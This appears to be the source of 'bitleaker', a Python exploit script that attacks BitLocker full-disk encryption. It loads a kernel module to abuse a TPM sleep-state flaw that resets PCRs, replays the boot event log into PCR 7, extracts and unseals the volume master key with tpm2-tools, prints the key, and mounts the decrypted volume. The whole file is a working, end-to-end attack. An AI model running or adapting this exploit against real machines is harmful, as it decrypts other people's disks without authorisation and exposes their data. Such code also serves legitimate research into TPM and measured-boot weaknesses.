#!/usr/bin/env python

import os
import sys
import subprocess
from collections import defaultdict
from time import sleep

RED = '\033[1;31m'
GREEN = '\033[1;32m'
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
MAGENTA = '\033[1;35m'
CYAN = '\033[1;36m'
WHITE = '\033[1;37m'
ENDC = '\033[0m'
BOLD = '\033[1m'
UNDERLINE = '\033[4m'
BLINK = '\033[5m'
SUCCESS = GREEN
FAIL = RED

SUSPEND_TIME = 15
WAIT_TIME = 30

BOOTMGFW_CERT_HASHES = {'sha256': '30bf464ee37f1bc0c7b1a5bf25eced275347c3ab1492d5623ae9f7663be07dd5'}

#
# Print colored message
#
def color_print(message, color):
    sys.stdout.write(color + message + ENDC)
    return

def info_print(message):
    color_print(message, BOLD)

def execute(cmd):
    info_print("Executing command '%s'\n" % cmd)
    return subprocess.check_output(cmd, shell=True)

def replay_event_log(output, hashtype = 'sha256'):

    info_print("Replaying TPM event log\n")

    assert 7 in output
    #assert 11 in output

    pcrs = []

    for e in output[7]:

        # Is there a hashtype hash?
        if hashtype in e['hashes']:
            hash = e['hashes'][hashtype]
        else:
            continue

        #print(e)

        #color_print("Extending PCR 7 with %s\n" % hash, WHITE)
        pcrs.append((7, hash))

        if e['event'] == b"EV_SEPARATOR":
            hash = BOOTMGFW_CERT_HASHES[hashtype]
            #color_print("Extending PCR 7 with boot loader hash %s\n" % hash, WHITE)
            pcrs.append((7, hash))
            break

    for pcr, hash in pcrs:
        #print("PCR %d: HASH:%s" % (pcr, hash))
        info_print("Extending PCR 7 with %s\n" % hash)
        cmd = "sudo tpm2_pcrextend %d:%s=%s" % (pcr, hashtype, hash)
        execute(cmd)


def parse_event_log():
    log = subprocess.check_output("docker run -v /sys/kernel/security/tpm0/binary_bios_measurements:/tmp/measurements tpm2-tools tpm2_eventlog /tmp/measurements", shell=True).split(b'\n')

    st = {'hashes': {}}

    output = defaultdict(list)

    for l in log:
        if l.startswith(b"- EventNum"):
            #print(st)

            if b'PCRIndex' not in st:
                continue

            pcr = int(st[b'PCRIndex'])
            #print("PCR %d" % pcr)

            et = st[b'EventType']
            #print(et)

            if 'hashes' not in st:
                continue
            #print(st['hashes'])

            output[pcr].append({'event': et, 'hashes': st['hashes']})

            st = {'hashes': {}}

        if l.startswith(b"  "):

            if l.startswith(b"  - AlgorithmId: "):
                st['alg'] = l.split(b": ")[1].decode("utf8")
                #print(st['alg'])
            else:
                cmd, *other = l.split(b": ")
                cmd = cmd[2:]
                #print(cmd, other)

                if cmd == b'  Digest':
                    #print("Digest YEAH %s" % st['alg'])

                    st['hashes'][st['alg']] = other[0][1:-1].decode()
                else:
                    if len(other) == 1:
                        st[cmd] = other[0]
                    else:
                        st[cmd] = other

    #print(log)
    #print(output)
    #sys.exit(1)

    return output

def get_pcrs():
    info_print('Getting PCR values\n')
    output = subprocess.check_output('sudo tpm2_pcrread', shell=True).split(b'\n')

    d = {}
    hash = None

    for l in output:
        #print(l)
        if l == b'':
            pass
        elif l[0] != ord(' '):
            hash = l[:-1]
            d[hash] = {}
        else:
            n, v, *ignore = l.split(b":")
            d[hash][int(n)] = int(v[1:], 16)

    #print(d)

    #sys.exit(1)

    return d

def wait():
    print("Waiting %d seconds" % WAIT_TIME)
    subprocess.run("sleep %d" % WAIT_TIME, shell=True)
 
def sleep():
    #subprocess.run("pm-suspend")
    subprocess.run("rtcwake -m mem -s %d" % SUSPEND_TIME, shell=True)
    #subprocess.run("systemctl suspend", shell=True)
 
def reset_pcrs():
    kmod = os.path.join(os.path.dirname(os.path.realpath(__file__)), "bitleaker-kernel-module/bitleaker-kernel-module.ko")
    info_print('Loading bitleaker kernel module\n')
    subprocess.check_output("insmod %s" % kmod, shell=True)
    info_print("Sleeping and waking\n")
    sleep()
    info_print("Removing kernel module\n")
    subprocess.check_output("rmmod %s" % kmod, shell=True)
    info_print("Sleeping and waking\n")
    wait()
    sleep()
    info_print("Awake, restoring hierarchy\n")
    wait()
    subprocess.run("sleep %d" % WAIT_TIME, shell=True)
    execute("tpm2_hierarchycontrol -C p shEnable set")
    execute("tpm2_hierarchycontrol -C p ehEnable set")

def get_drive_path():
    # Searching for BitLocker-locked partitions
    info_print('Search for BitLocker-locked partitions.\n')

    if len(sys.argv) != 2:
        output = subprocess.check_output('sudo fdisk -l 2>/dev/null | grep "Microsoft basic data"', shell=True).splitlines()
        if len(output) == 0:
            color_print('    [>>] BitLocker-locked partition is not found.\n', FAIL)
            info_print('    [>>] Please try with the explicit drive path. ./bitleaker.py <drive path>\n')
            sys.exit(-1)

        drive_path = output[0].split(b' ')[0]
    else:
        drive_path = sys.argv[1]

    drive_path = drive_path.decode("utf8")

    info_print('    [>>] BitLocker-locked partition is [%s]\n\n' % drive_path)

    return drive_path

def unseal(drive):
    info_print("Extracting sealed keys from dislocker-meta\n")
    dislocker_path = os.path.join(os.path.dirname(os.path.realpath(__file__)), "dislocker/src/dislocker")
    dislocker_output = execute("%s-metadata -v -v -v -V %s" % (dislocker_path, drive)).splitlines()

    found_tpm = False
    found_hex = False
    all_bytes = b""
    for l in dislocker_output:
        #print(l)

        if found_tpm:
            if b"[DEBUG] 0x0000" in l:
                found_hex = True
                #print(l)
                l = l.replace(b"-", b" ")
                new_bytes = bytes([int("0x%s" % b.decode(), 16) for b in l.split(b" ")[8:-1]])
                all_bytes = all_bytes + new_bytes
                #
                # pub_size = int.from_bytes(all_bytes[pub_offset:pub_offset+2], "big")
                # print(pub_size)print(new_bytes.hex())
            elif found_hex:
                break

        if b"TPM_ENCODED" in l:
            found_tpm = True

    # Get pub.bin and priv.bin?
    priv_size = int.from_bytes(all_bytes[0:2], "big")
    priv_key = all_bytes[0:2+priv_size]
    #print(priv_key.hex())

    pub_offset = priv_size + 2
    pub_size = int.from_bytes(all_bytes[pub_offset:pub_offset+2], "big")
    pub_key = all_bytes[pub_offset:pub_offset+2+pub_size]
    #print(pub_key.hex())

    with open("/tmp/priv.bin", "wb") as f:
        f.write(priv_key)
    with open("/tmp/pub.bin", "wb") as f:
        f.write(pub_key)

    # tpm2_load -C 0x81000001 -u pub.bin -r priv.bin -c key.ctx
    # tpm2_startauthsession --policy-session -S session.dat
    # tpm2_policyauthvalue -S session.dat
    # tpm2_policypcr -S session.dat -l sha256:7,11
    # tpm2_unseal -c key.ctx -p session:session.dat -o key.bin
    
    info_print("Loading sealed key into TPM\n")
    execute("tpm2_load -C 0x81000001 -u /tmp/pub.bin -r /tmp/priv.bin -c /tmp/key.ctx")

    info_print("Starting auth session\n")
    execute("tpm2_startauthsession --policy-session -S /tmp/session.dat")
    execute("tpm2_policyauthvalue -S /tmp/session.dat")
    execute("tpm2_policypcr -S /tmp/session.dat -l sha256:7,11")

    info_print("Unsealing VMK key\n")
    execute("tpm2_unseal -c /tmp/key.ctx -p session:/tmp/session.dat -o /tmp/key.bin")

    execute("dd bs=1 if=/tmp/key.bin of=/tmp/vmk.bin skip=12")

    with open("/tmp/vmk.bin", "rb") as f:
        vmk = f.read()

    info_print("The VMK key is: %s\n" % vmk.hex())

    info_print("Running dislocker\n")
    execute("mkdir -p /tmp/mnt")

    # Re-entrancy...
    execute("umount /mnt/dislocker || true")
    execute("umount /tmp/mnt || true")

    execute("%s-fuse -K /tmp/vmk.bin %s -- /tmp/mnt" % (dislocker_path, drive))
    execute("mkdir -p /mnt/dislocker")
    execute("mount -o ro,loopback /tmp/mnt/dislocker-file /mnt/dislocker")


    color_print("The BitLocker volume is opened in /mnt/dislocker\n", GREEN)

# Check what the current PCR values are
output = get_pcrs()

hash = next(iter(output))

if 0 not in output[hash]:
    color_print("Unable to find PCR 0\n", FAIL)
    sys.exit(1)

# Fix me for non SHA 256...
if output[hash][0] == 0:
    color_print("PCR 0 was already zero.  Are you sure secure boot is enabled?\n", FAIL)

# Use the bad dream vulnerability to reset PCRs
reset_pcrs()

# Get the new PCR values
newoutput = get_pcrs()

if False:
    for l in output:
        info_print('%s\n' % l)

    for l in newoutput:
        info_print('%s\n' % l)

zero = False

# Which PCRs changed?
for pcr in output[hash].keys():
    old = output[hash][pcr]
    new = newoutput[hash][pcr]
    
    if old != new:
        color_print("PCR %d changed from %s to %s\n" % (pcr, old, new), GREEN)
        if new == 0:
            zero = True

if not zero:
    color_print("Machine does not appear to be vulnerable\n", FAIL)

# Replay event log to reset PCRs
info_print("Replaying event log...\n")
log = parse_event_log()
#print(log)
replay_event_log(log)
#subprocess.check_output("tpm2_pcrread sha256:7", shell=True)

# Unseal the VMK key
unseal(get_drive_path())
